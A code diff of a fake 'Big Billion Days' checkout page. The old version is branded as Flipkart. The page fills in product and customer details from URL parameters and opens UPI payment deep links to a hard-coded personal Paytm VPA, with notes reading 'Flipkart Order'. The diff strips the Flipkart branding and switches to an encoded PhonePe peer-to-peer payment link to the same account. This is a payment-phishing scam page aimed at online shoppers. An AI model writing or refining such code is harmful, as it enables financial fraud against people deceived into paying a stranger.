@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
- <title>Big Billion Days - Flipkart</title>
+ <title>BIg Billion Days</title>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
   <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
   <style>
@@ -160,19 +160,15 @@
     
     const urlParams = new URLSearchParams(window.location.search);
     
-    const productName = decodeURIComponent(urlParams.get('product') || 'Premium Wireless Headphones');
-    const productPrice = urlParams.get('price') || '299';
-    let productImage = urlParams.get('image') || 'https://m.media-amazon.com/images/I/51utC7C8PUL._SX522_.jpg';
+    const productName = decodeURIComponent(urlParams.get('product') || '');
+    const productPrice = urlParams.get('price') || '';
+    let productImage = urlParams.get('image') || '';
     
-    const customerName = decodeURIComponent(urlParams.get('name') || 'Rahul Sharma');
-    const customerAddressLine = decodeURIComponent(urlParams.get('address_line') || 'House No. 42, Street No. 3, Green Park Extension');
-    const customerCity = decodeURIComponent(urlParams.get('city') || 'New Delhi - 110016');
-    const addressType = urlParams.get('addressType') || 'Home';
-    const customerPhone = urlParams.get('phone') || '+91 98765 43210';
-
-    // UPI ID - aapka diya hua
-    const UPI_ID = 'paytm.s1x53ga@pty';
-    const PAYEE_NAME = 'Flipkart Payments';
+    const customerName = decodeURIComponent(urlParams.get('name') || '');
+    const customerAddressLine = decodeURIComponent(urlParams.get('address_line') || '');
+    const customerCity = decodeURIComponent(urlParams.get('city') || '');
+    const addressType = urlParams.get('addressType') || '';
+    const customerPhone = urlParams.get('phone') || '';
 
     document.getElementById('productName').textContent = productName;
     
@@ -190,8 +186,8 @@
     let productPriceNum = 0;
     let formattedPrice = '';
     if (productPrice) {
-      productPriceNum = parseInt(productPrice) || 299;
-      formattedPrice = '₹' + productPriceNum.toLocaleString('en-IN');
+      productPriceNum = parseInt(productPrice) || 0;
+      formattedPrice = productPriceNum ? '₹' + productPriceNum.toLocaleString('en-IN') : productPrice;
     }
     
     document.getElementById('productPrice').textContent = formattedPrice;
@@ -219,6 +215,8 @@
 
     const payButton = document.getElementById('payButton');
     let selectedMethod = 'PhonePe';
+    
+    const UPI_ID = 'paytm.s1x53ga@pty';
 
     function isMobileDevice() {
       return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
@@ -228,29 +226,18 @@
       return 'TXN' + Date.now().toString().slice(-8) + Math.floor(Math.random() * 1000);
     }
 
-    // 🟢 PHONEPE PAYMENT LOGIC - Exactly as you wanted
     function createPhonePeUrl() {
-      const transactionId = generateTransactionId();
-      // PhonePe deep link format with your UPI ID
-      return `phonepe://pay?pa=${UPI_ID}&pn=${encodeURIComponent(PAYEE_NAME)}&am=${productPriceNum}&tn=${encodeURIComponent('Flipkart Order ' + transactionId)}&cu=INR`;
-    }
-
-    // 🟢 PAYTM PAYMENT LOGIC
-    function createPaytmUrl() {
-      const transactionId = generateTransactionId();
-      return `paytmmp://pay?pa=${UPI_ID}&pn=${encodeURIComponent(PAYEE_NAME)}&am=${productPriceNum}&tn=${encodeURIComponent('Flipkart Order ' + transactionId)}&cu=INR`;
-    }
-
-    // 🟢 GOOGLE PAY LOGIC
-    function createGooglePayUrl() {
-      const transactionId = generateTransactionId();
-      return `tez://upi/pay?pa=${UPI_ID}&pn=${encodeURIComponent(PAYEE_NAME)}&am=${productPriceNum}&tn=${encodeURIComponent('Flipkart Order ' + transactionId)}&cu=INR`;
-    }
-
-    // Generic UPI fallback
-    function createGenericUpiUrl() {
-      const transactionId = generateTransactionId();
-      return `upi://pay?pa=${UPI_ID}&pn=${encodeURIComponent(PAYEE_NAME)}&am=${productPriceNum}&tn=${encodeURIComponent('Flipkart Order ' + transactionId)}&cu=INR`;
+      const data = {
+        contact: { vpa: UPI_ID, type: "VPA" },
+        p2pPaymentCheckoutParams: {
+          note: generateTransactionId(),
+          transactionContext: "p2p",
+          initialAmount: String(productPriceNum * 100),
+          currency: "INR",
+          checkoutType: "DEFAULT"
+        }
+      };
+      return `phonepe://native?data=${btoa(JSON.stringify(data))}&id=p2ppayment`;
     }
 
     window.selectPayment = function(method, element) {
@@ -268,23 +255,6 @@
       if (element) element.classList.add('selected');
     };
 
-    // Save order details before payment
-    function saveOrderDetails() {
-      const orderDetails = {
-        productName: productName,
-        productPrice: productPriceNum,
-        productImage: productImage,
-        customerName: customerName,
-        customerAddress: customerAddressLine + ', ' + customerCity,
-        customerPhone: customerPhone,
-        paymentMethod: selectedMethod,
-        upiId: UPI_ID,
-        orderId: 'OD' + Date.now().toString().slice(-8),
-        orderDate: new Date().toLocaleString()
-      };
-      sessionStorage.setItem('currentOrder', JSON.stringify(orderDetails));
-    }
-
     payButton.onclick = function(e) {
       e.preventDefault();
 
@@ -300,55 +270,26 @@
       }
 
       if (!isMobileDevice()) {
-        alert('Please open this page on a mobile device to make UPI payment');
+        payButton.textContent = "Use Mobile Device";
+        setTimeout(() => {
+          payButton.textContent = `Pay with ${selectedMethod}`;
+        }, 1500);
         return;
       }
 
-      // Save order details
-      saveOrderDetails();
-
-      // Disable button
       payButton.disabled = true;
       payButton.classList.add('processing');
-      payButton.textContent = `Opening ${selectedMethod}...`;
+      payButton.textContent = 'Opening PhonePe...';
 
-      // Get payment URL based on selected method
-      let paymentUrl = '';
-      switch(selectedMethod) {
-        case 'PhonePe':
-          paymentUrl = createPhonePeUrl();
-          break;
-        case 'Paytm':
-          paymentUrl = createPaytmUrl();
-          break;
-        case 'Google Pay':
-          paymentUrl = createGooglePayUrl();
-          break;
-        default:
-          paymentUrl = createGenericUpiUrl();
-      }
+      window.location.href = createPhonePeUrl();
 
-      // Open UPI app
-      window.location.href = paymentUrl;
-
-      // Redirect to processing page after 2 seconds with all product details
       setTimeout(() => {
-        const params = new URLSearchParams({
-          product: productName,
-          price: productPriceNum,
-          image: productImage,
-          method: selectedMethod,
-          name: customerName,
-          address: customerAddressLine,
-          city: customerCity,
-          phone: customerPhone
-        }).toString();
-        
-        window.location.href = 'processing.html?' + params;
+        payButton.disabled = false;
+        payButton.classList.remove('processing');
+        payButton.textContent = `Pay with ${selectedMethod}`;
       }, 2000);
     };
 
-    // Handle image errors
     document.querySelectorAll('img').forEach(img => {
       img.addEventListener('error', function() {
         const alt = this.alt;
@@ -360,11 +301,6 @@
         this.onerror = null;
       });
     });
-
-    // Check if returning from UPI app
-    if (document.referrer && (document.referrer.includes('phonepe') || document.referrer.includes('paytm') || document.referrer.includes('tez'))) {
-      console.log('Returned from UPI app');
-    }
   })();
 </script>
 </body>
